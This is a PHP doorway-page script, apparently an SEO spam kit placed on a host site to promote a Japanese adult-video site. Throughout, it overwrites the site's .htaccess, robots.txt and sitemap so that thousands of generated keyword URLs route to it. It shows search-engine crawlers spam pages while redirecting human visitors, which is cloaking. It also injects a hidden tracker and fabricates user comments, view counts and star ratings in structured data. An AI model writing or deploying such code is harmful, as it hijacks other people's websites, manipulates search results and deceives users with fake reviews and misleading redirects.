<?php
// --- SEO.TXT V34 (AUTO HTACCESS + HISTATS + SCHEMA STAR) ---
$money_site = "https://javpornsub.net"; 
$debug_mode = true; 

// 1. AUTO DETECT FOLDER (PENTING)
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
$path_folder = str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']); // misal: /gallery/ atau /
$base_url   = $protocol . $_SERVER['HTTP_HOST'] . $path_folder;
$uri        = $_SERVER['REQUEST_URI'];
$req_slug   = str_replace($path_folder, "", $uri); 
$slug       = basename(parse_url($req_slug, PHP_URL_PATH));
if(!$slug || $slug == 'index.php') $slug = 'home';

// --- HISTATS CONFIG ---
$histats = '
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(["Histats.start", "1,4950727,4,0,0,0,00010000"]);
_Hasync.push(["Histats.fasi", "1"]);
_Hasync.push(["Histats.track_hits", ""]);
(function() {
var hs = document.createElement("script"); hs.type = "text/javascript"; hs.async = true;
hs.src = ("//s10.histats.com/js15_as.js");
(document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4950727&101" alt="" border="0"></a></noscript>
';

// --- CONFIG URL ---
$vip_urls = ['jav-sub-indo', 'jav-subbed', 'jav-sub-eng', 'jav-uncensored', 'nonton-jav', 'bokep-terbaru'];
$pre_id = ["nonton", "streaming", "download", "link", "situs", "video", "film", "koleksi", "gudang", "galeri"];
$mid_id = ["jav", "bokep-jepang", "jav-sub-indo", "film-semi", "video-bokep", "japanese-av", "cewek-jepang"];
$suf_id = ["sub-indo", "tanpa-vpn", "full-hd", "no-sensor", "online", "2025", "terbaru", "lengkap", "viral"];
$pre_en = ["watch", "stream", "get", "full", "uncensored", "hd", "hq", "best", "new", "top"];
$mid_en = ["jav", "japanese-av", "asian-sex", "jav-uncensored", "j-girls", "nippon-sex"];
$suf_en = ["english-sub", "no-vpn", "free", "leaked", "full-movie", "online-free", "1080p"];
$categories = ["Uncensored", "Amateur", "Creampie", "Milf", "Schoolgirl", "Idol", "Hardcore", "Exclusive"];

// --- FITUR INSTALL OTOMATIS (?up) ---
if(isset($_GET['up'])){
    // 1. Buat Sitemap
    $x='<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
    $x.='<url><loc>'.$base_url.'</loc><lastmod>'.date('Y-m-d').'</lastmod><changefreq>daily</changefreq><priority>1.0</priority></url>';
    foreach($vip_urls as $v) $x.='<url><loc>'.$base_url.$v.'</loc><lastmod>'.date('Y-m-d').'</lastmod><changefreq>daily</changefreq><priority>1.0</priority></url>';
    for($i=0; $i<2500; $i++){
        $lang_mode = (rand(0,1) == 0) ? 'id' : 'en';
        if($lang_mode == 'id') $slug_gen = $pre_id[array_rand($pre_id)].'-'.$mid_id[array_rand($mid_id)].'-'.$suf_id[array_rand($suf_id)];
        else $slug_gen = $pre_en[array_rand($pre_en)].'-'.$mid_en[array_rand($mid_en)].'-'.$suf_en[array_rand($suf_en)];
        $x.='<url><loc>'.$base_url.$slug_gen.'</loc><lastmod>'.date('Y-m-d').'</lastmod><changefreq>daily</changefreq><priority>0.8</priority></url>';
    }
    $x.='</urlset>';
    @file_put_contents("sitemap.xml", $x);
    
    // 2. Buat Robots.txt
    @file_put_contents("robots.txt", "User-agent: *\nAllow: /\nSitemap: ".$base_url."sitemap.xml");

    // 3. AUTO CREATE .HTACCESS (Sesuai Folder)
    // Deteksi nama file loader (biasanya index.php, tapi jaga2 kalau diganti)
    $script_name = basename($_SERVER['SCRIPT_NAME']); 
    $htaccess_content = "
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase $path_folder
RewriteRule ^$script_name$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . {$path_folder}$script_name [L]
</IfModule>";
    @file_put_contents(".htaccess", trim($htaccess_content));

    echo "<h3>✅ INSTALL SUCCESS</h3>";
    echo "<ul>";
    echo "<li>Folder: <b>$path_folder</b></li>";
    echo "<li>Sitemap: <a href='sitemap.xml'>Created</a></li>";
    echo "<li>Robots.txt: Created</li>";
    echo "<li>.htaccess: <b>Created (Auto-Configured)</b></li>";
    echo "</ul>";
    exit;
}

// --- FILTER ---
function is_valid($slug, $a, $b, $c, $d) {
    if(in_array($slug, $d)) return true;
    $p = explode('-', $slug);
    foreach($p as $x) if(in_array($x, $a) || in_array($x, $b) || in_array($x, $c)) return true;
    return false;
}
$ok = false;
if(is_valid($slug, $pre_id, $mid_id, $suf_id, $vip_urls)) $ok = true;
if(is_valid($slug, $pre_en, $mid_en, $suf_en, $vip_urls)) $ok = true;
if(!$ok && $slug!='home' && $slug!='sitemap.xml') return;
if($slug=='sitemap.xml'){ if(file_exists('sitemap.xml')){ header('Content-Type: application/xml'); readfile('sitemap.xml'); exit; } }

// --- CLOAKING ---
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$is_bot = preg_match('/google|bing|yahoo|msn/', $ua) ? true : false;
if(!$is_bot && !$debug_mode){
    echo '<!DOCTYPE html><html><head><meta name="robots" content="noindex"><title>Loading...</title></head><body><div style="display:none">'.$histats.'</div><script>setTimeout(function(){window.location.href="'.$money_site.'";},300);</script></body></html>'; exit;
}

// --- CONTENT GENERATOR ---
function spin($s){ return preg_replace_callback('/\{([^{}]+)\}/', function($m){ $o=explode('|',$m[1]); return $o[rand(0,count($o)-1)]; }, $s); }
$kw = ucwords(str_replace(['-','+'], ' ', $slug));
if($slug == 'home') $kw = "Jav Streaming Archive";
$lang = (preg_match('/eng|watch|stream|uncensored|free/', $slug)) ? 'en' : 'id';
$cat = $categories[array_rand($categories)];

$views = number_format(rand(10000, 99000));
$code = strtoupper(substr(md5($slug), 0, 4))."-".rand(100,999);
$date = date("d M Y");
$rating_val = rand(45, 50) / 10;
$rating_count = rand(1000, 5000);

if ($lang == 'id') {
    $title = "$kw Full Durasi - Nonton Gratis $cat ($date)";
    $desc = "Nonton $kw Sub Indo kualitas HD. Streaming $cat Jepang terbaru kode $code tanpa VPN. Download video $kw full version.";
    $h1 = "Nonton $kw Subtitle Indonesia";
    $bread_home = "Beranda";
} else {
    $title = "Watch $kw Full HD - Uncensored $cat ($date)";
    $desc = "Stream $kw free high quality. Watch $cat Japanese video code $code no VPN. Download $kw full uncensored.";
    $h1 = "Watch $kw Full Version";
    $bread_home = "Home";
}

// FAKE COMMENTS
$comments_id = [
    ["Budi Santoso", "Link nya mantap min, lancar jaya."],
    ["Asep K.", "Akhirnya nemu yang full durasi, makasih gan."],
    ["Rian99", "Izin sedot gan, kualitas HD beneran."],
    ["Dono", "Tanpa VPN beneran bisa, josss."],
    ["Indra", "Update lagi dong min yang seri ini."]
];
$comments_en = [
    ["John D.", "Finally found the full version, thanks admin."],
    ["Mike88", "Great quality, streaming is fast."],
    ["Alex", "No VPN needed, works perfectly."],
    ["SinsFan", "Please upload more from this actress."],
    ["Tom", "Good collection, bookmarking this site."]
];
$active_comments = ($lang == 'id') ? $comments_id : $comments_en;
shuffle($active_comments);
$show_comments = array_slice($active_comments, 0, 3);

// SCHEMA BREADCRUMB
$schema_bread = [
    "@context" => "https://schema.org",
    "@type" => "BreadcrumbList",
    "itemListElement" => [
        ["@type"=>"ListItem", "position"=>1, "name"=>$bread_home, "item"=>$base_url],
        ["@type"=>"ListItem", "position"=>2, "name"=>$cat, "item"=>$base_url."category/".strtolower($cat)],
        ["@type"=>"ListItem", "position"=>3, "name"=>$kw]
    ]
];

// SCHEMA MOVIE (BINTANG DI SERP)
$schema_movie = [
    "@context" => "https://schema.org",
    "@type" => "Movie",
    "name" => $title,
    "description" => $desc,
    "image" => "https://via.placeholder.com/600x400.png?text=".urlencode($kw),
    "dateCreated" => date("Y-m-d"),
    "aggregateRating" => [
        "@type" => "AggregateRating",
        "ratingValue" => $rating_val,
        "bestRating" => "5",
        "worstRating" => "1",
        "ratingCount" => $rating_count
    ]
];
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $title; ?> | <?php echo $_SERVER['HTTP_HOST']; ?></title>
    <meta name="description" content="<?php echo $desc; ?>">
    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
    <link rel="canonical" href="<?php echo $base_url . $slug; ?>">
    
    <meta property="og:title" content="<?php echo $title; ?>" />
    <meta property="og:description" content="<?php echo $desc; ?>" />
    <meta property="og:type" content="video.movie" />
    <meta property="og:url" content="<?php echo $base_url . $slug; ?>" />
    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=<?php echo urlencode($kw); ?>" />
    
    <script type="application/ld+json"><?php echo json_encode($schema_bread); ?></script>
    <script type="application/ld+json"><?php echo json_encode($schema_movie); ?></script>

    <style>
        body{background:#121212;color:#ddd;font-family:sans-serif;margin:0;padding:0;line-height:1.6}
        .container{max-width:800px;margin:0 auto;padding:15px}
        .breadcrumb{font-size:12px;color:#888;margin-bottom:10px}
        .breadcrumb a{color:#bbb;text-decoration:none}
        h1{color:#ff0033;border-bottom:1px solid #333;padding-bottom:10px;font-size:20px}
        .video-box{background:#000;height:400px;display:flex;align-items:center;justify-content:center;color:#fff;cursor:pointer;margin:20px 0;position:relative}
        .play-btn{font-size:60px;color:#ff0033;opacity:0.8}
        .meta-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:13px}
        .meta-table td{border:1px solid #333;padding:8px}
        .meta-table td:first-child{font-weight:bold;width:30%;background:#1e1e1e}
        .tags a{display:inline-block;background:#222;padding:4px 10px;margin:3px;border-radius:15px;color:#aaa;text-decoration:none;font-size:12px}
        .comments{margin-top:40px;border-top:2px solid #333;padding-top:20px}
        .comm-item{margin-bottom:15px;border-bottom:1px solid #222;padding-bottom:10px}
        .comm-user{font-weight:bold;color:#ccc;font-size:13px}
        .comm-text{font-size:13px;color:#999;margin-top:3px}
        .rating-box{background:#1e1e1e;padding:10px;border-radius:5px;margin-bottom:15px;font-size:13px;color:#ffcc00}
        footer{margin-top:50px;text-align:center;font-size:11px;color:#555;padding-bottom:20px}
    </style>
</head>
<body>
    <div class="container">
        <div class="breadcrumb">
            <a href="<?php echo $base_url; ?>"><?php echo $bread_home; ?></a> › 
            <a href="#"><?php echo $cat; ?></a> › 
            <span><?php echo $kw; ?></span>
        </div>

        <h1><?php echo $h1; ?></h1>

        <div class="rating-box">
            ⭐ <strong><?php echo $rating_val; ?>/5.0</strong> (<?php echo number_format($rating_count); ?> votes)
        </div>

        <div class="video-box" onclick="location.href='<?php echo $money_site; ?>'">
            <div class="play-btn">▶</div>
            <div style="position:absolute;bottom:10px;right:10px;background:rgba(0,0,0,0.7);padding:2px 5px;font-size:12px">HD 1080p</div>
        </div>

        <table class="meta-table">
            <tr><td>Video Code</td><td><?php echo $code; ?></td></tr>
            <tr><td>Release Date</td><td><?php echo $date; ?></td></tr>
            <tr><td>Duration</td><td><?php echo rand(20,180); ?> min</td></tr>
            <tr><td>Category</td><td><?php echo $cat; ?></td></tr>
            <tr><td>Views</td><td><?php echo $views; ?></td></tr>
        </table>

        <p>
            <?php echo ($lang=='id') 
            ? "Nonton <strong>$kw</strong> sub indo. Video ini masuk dalam kategori $cat dengan kode $code. Streaming lancar tanpa buffering hanya di server kami." 
            : "Watch <strong>$kw</strong> full version. This video is listed under $cat category with code $code. Fast streaming no buffering only on our server."; ?>
        </p>

        <div class="comments">
            <h3><?php echo ($lang=='id') ? "Komentar Terbaru" : "Recent Comments"; ?></h3>
            <?php foreach($show_comments as $c): ?>
            <div class="comm-item">
                <div class="comm-user">👤 <?php echo $c[0]; ?> <span style="font-weight:normal;font-size:11px;color:#555">• <?php echo rand(1,5); ?> hours ago</span></div>
                <div class="comm-text"><?php echo $c[1]; ?></div>
            </div>
            <?php endforeach; ?>
        </div>

        <div class="tags">
            <strong>Related:</strong><br>
            <?php 
            for($i=0; $i<20; $i++) {
                if($lang == 'id') $t = $pre_id[array_rand($pre_id)].'-'.$mid_id[array_rand($mid_id)].'-'.$suf_id[array_rand($suf_id)];
                else $t = $pre_en[array_rand($pre_en)].'-'.$mid_en[array_rand($mid_en)].'-'.$suf_en[array_rand($suf_en)];
                $txt = ucwords(str_replace('-',' ',$t));
                echo "<a href='$base_url$t'>$txt</a>";
            } ?>
        </div>
    </div>

    <footer>
        Copyright &copy; <?php echo date("Y"); ?> <?php echo $_SERVER['HTTP_HOST']; ?>.
        <br><br>
        <?php echo $histats; ?>
    </footer>
</body>
</html>
<?php exit; ?>
